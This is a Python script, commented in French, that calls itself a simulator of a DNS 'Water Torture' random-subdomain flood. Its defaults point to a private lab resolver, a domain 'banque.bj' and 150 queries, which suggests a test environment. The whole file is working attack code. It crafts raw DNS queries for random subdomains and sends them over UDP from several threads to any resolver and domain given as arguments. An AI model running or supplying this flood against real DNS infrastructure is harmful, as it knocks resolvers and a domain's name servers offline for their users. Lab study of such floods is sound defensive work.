#!/usr/bin/env python3
"""
Simulateur DDoS Applicatif (Water Torture / Random Subdomain Flood).
Envoi haute fréquence multi-threads vers le résolveur.
"""
import sys
import time
import random
import string
import argparse
import socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

def random_string(length=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def build_dns_query(qname):
    # En-tête DNS standard
    tid = random.randint(1, 65535)
    header = tid.to_bytes(2, 'big') + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    q = b''
    for part in qname.split('.'):
        q += len(part).to_bytes(1, 'big') + part.encode()
    q += b'\x00\x00\x01\x00\x01' # Type A, Class IN
    return header + q

def send_one_query(target_dns, target_domain):
    sub = random_string(14)
    fqdn = f"{sub}.{target_domain}"
    pkt = build_dns_query(fqdn)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.sendto(pkt, (target_dns, 53))
    except Exception:
        pass
    finally:
        s.close()

def run_ddos_flood(target_dns: str, target_domain: str, count: int, delay: float):
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"================================================================")
    print(f"[*] Attaque démarrée à : {now_str}")
    print(f"[*] Type : Water Torture / Random Subdomain Flood (Haute Fréquence)")
    print(f"[*] Cible Résolveur : {target_dns}")
    print(f"[*] Domaine ciblé : *.{target_domain}")
    print(f"[*] Volume prévu : {count} requêtes UDP brutes")
    print(f"================================================================\n")

    start_time = time.time()
    sent = 0

    with ThreadPoolExecutor(max_workers=10) as executor:
        for i in range(count):
            executor.submit(send_one_query, target_dns, target_domain)
            sent += 1
            if sent % 25 == 0:
                cur_ts = datetime.now().strftime("%H:%M:%S")
                print(f"  [{cur_ts}] > {sent}/{count} paquets UDP transmis...")
            if delay > 0:
                time.sleep(delay)

    duration = time.time() - start_time
    rate = sent / duration if duration > 0 else 0
    end_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[+] Attaque terminée à : {end_str}")
    print(f"[+] Total émis : {sent} requêtes en {duration:.2f}s (~{rate:.1f} req/s).")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Water Torture DNS")
    parser.add_argument("--dns", default="172.28.0.2", help="IP du résolveur")
    parser.add_argument("--domain", default="banque.bj", help="Domaine racine ciblé")
    parser.add_argument("--count", type=int, default=150, help="Nombre total de requêtes")
    parser.add_argument("--delay", type=float, default=0.005, help="Délai entre requêtes")
    args = parser.parse_args()

    run_ddos_flood(args.dns, args.domain, args.count, args.delay)
